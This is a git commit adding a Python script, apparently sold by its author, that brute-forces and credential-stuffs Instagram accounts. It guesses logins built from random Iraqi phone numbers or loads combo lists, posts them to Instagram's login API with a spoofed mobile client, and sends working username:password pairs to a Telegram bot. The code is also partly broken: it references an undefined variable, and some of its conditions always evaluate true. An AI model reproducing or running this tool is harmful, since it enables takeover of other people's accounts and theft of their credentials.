51f1735861553d57695b3a676ec56d78de2f1dad
j2s20202929292j22n <88910562+j2s20202929292j22n@users.noreply.github.com>
2021-08-14 01:25:36 +0300

    Add files via upload

---
+++ Inistav2.py
@@ -0,0 +1,166 @@
+#Code by tlyak
+import os , sys
+from time import sleep
+import random
+import requests
+from uuid import uuid4
+
+
+def close():
+    input('')
+    sys.exit()
+l = '\033[91m'
+h = 0
+b = 0
+s = 0
+block = 0
+
+logo = l+"""
+\033[92;1m
+                                              
+ 
+888888b.  Y88b   d88P 888b    888 
+888  "88b  Y88b d88P  8888b   888 
+888  .88P   Y88o88P   88888b  888 
+8888888K.    Y888P    888Y88b 888 
+888  "Y88b   d888b    888 Y88b888 
+888    888  d88888b   888  Y88888 
+888   d88P d88P Y88b  888   Y8888 
+8888888P" d88P   Y88b 888    Y888                                         
+=======================================
+  Author   : TLYAK
+  Note : 10$
+  Telegram : lililliilliil
+=======================================
+"""
+tele = input("\033[33;1mAmaday Y/n: ")
+os.system('clear')
+if "Y" in tele:
+    id = input("\033[37;1mID TELEGRAM: ")
+    bot = input("\033[37;1mTOKEN BOT: ")
+elif "y" in tele:
+    id = input("ID TELEGRAM: ")
+    bot = input("TOKEN BOT: ")
+    
+print(logo)
+xoshnaw = input("""1- num+num Cheker
+2- Load Combo Cheker
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n
+halbzhera: """)
+if xoshnaw == "1":
+   
+    nmuna = '0123456789'
+    os.system('clear')
+    print(logo)
+    print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
+
+    while True:
+        fuck = str(''.join((random.choice(nmuna) for i in range(8))))
+        user = '+96477' + fuck
+        pasw = '077' + fuck
+        #print(f"\n{user} \n {pasw}")
+        req = requests.session()
+        log_head = {
+        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
+        'Accept': "*/*",
+        'Cookie': 'missing',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-IG-Connection-Type': 'WIFI',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Host': 'i.instagram.com'}
+        uid = str(uuid4())
+        log_data = {
+            'uuid': uid,
+            'password': pasw,
+            'username': user,
+            'device_id': uid,
+            'from_reg': 'false',
+            '_csrftoken': 'missing',
+            'login_attempt_countn': '0'}
+        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
+        #print(r.text)
+        if "logged_in_user" in r.text:
+            if "Y" or "y" in tele:
+                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=GOOD: {user}:{pasw}")
+            h += 1
+            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
+        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
+            b += 1
+            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
+        elif 'challenge_required' or 'two' in log.text:
+            s += 1
+            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
+        elif 'Please wait a few minutes' in log.text:
+            block += 1
+            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
+        elif 'Bad request' in log.text:
+            b += 1
+            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
+        else:
+            b+=1    
+            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
+
+elif xoshnaw =="2":
+    os.system('clear')
+    print(logo)
+    co = input("\033[1;91mCOMBO: ")
+    if '.txt' in co:
+        pass
+    else:
+        co  = co + '.txt'
+   
+    os.system('clear')
+    print(logo)
+    print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
+    acc = open(co,"r").read().splitlines()
+    for combo in acc:
+        user = combo.split(":")[0]
+        pasw = combo.split(":")[1]
+        req = requests.session()
+        log_head = {
+        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
+        'Accept': "*/*",
+        'Cookie': 'missing',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-IG-Connection-Type': 'WIFI',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Host': 'i.instagram.com'}
+        uid = str(uuid4())
+        log_data = {
+            'uuid': uid,
+            'password': pasw,
+            'username': user,
+            'device_id': uid,
+            'from_reg': 'false',
+            '_csrftoken': 'missing',
+            'login_attempt_countn': '0'}
+        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
+        #print(r.text)
+        if "logged_in_user" in r.text:
+            if "Y" or "y" in tele:
+                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=GOOD: {user}:{pasw}")
+         
+            h += 1
+            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
+            b += 1
+            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
+        elif 'challenge_required' in log.text:
+            s += 1
+            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
+        elif 'Please wait a few minutes' in log.text:
+            block += 1
+            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
+        elif 'Bad request' in log.text:
+            b += 1
+            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
+        else:
+            b+=1    
+            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
+
+    
+
